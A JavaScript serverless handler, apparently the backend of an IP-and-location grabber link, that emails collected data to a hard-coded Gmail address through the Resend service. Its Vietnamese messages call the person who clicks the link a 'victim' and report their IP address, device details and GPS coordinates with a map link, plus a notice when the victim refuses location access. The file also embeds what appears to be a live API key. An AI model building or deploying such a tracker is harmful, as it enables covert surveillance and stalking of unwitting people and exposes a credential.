import { Resend } from 'resend';

const resend = new Resend('re_5WiANvj2_6pGXmhNn5AMEyJiYmDYGNDoU');

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

    try {
        const data = req.body;
        let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
        if (ip.includes(',')) ip = ip.split(',')[0].trim();

        let subject = "🎯 Có người click link!";
        let htmlContent = "";

        if (data.type === "basic_info") {
            subject = "📱 Thông tin thiết bị mới";
            htmlContent = `<h3>Thông tin thiết bị mới</h3><p><b>IP:</b> ${ip}</p><p><b>Thiết bị (UA):</b> ${data.userAgent}</p><p><b>Màn hình:</b> ${data.screen}</p><p><b>Hệ điều hành:</b> ${data.platform}</p>`;
        } else if (data.type === "gps") {
            subject = "📍 ĐÃ LẤY ĐƯỢC GPS!";
            htmlContent = `<h3>Đã lấy được vị trí GPS!</h3><p><b>IP:</b> ${ip}</p><p><b>Vĩ độ:</b> ${data.lat}</p><p><b>Kinh độ:</b> ${data.lon}</p><p><a href="https://www.google.com/maps?q=${data.lat},${data.lon}">Xem trên Google Maps</a></p>`;
        } else if (data.type === "gps_denied") {
            subject = "⚠️ Nạn nhân từ chối GPS";
            htmlContent = `<h3>Nạn nhân từ chối cấp quyền GPS</h3><p><b>IP:</b> ${ip}</p>`;
        }

        await resend.emails.send({
            from: 'Tracker <onboarding@resend.dev>',
            to: 'thienlongnhan2k9@gmail.com',
            subject: subject,
            html: htmlContent
        });

        return res.status(200).json({ success: true });
    } catch (error) {
        return res.status(500).json({ error: 'Internal Server Error' });
    }
}
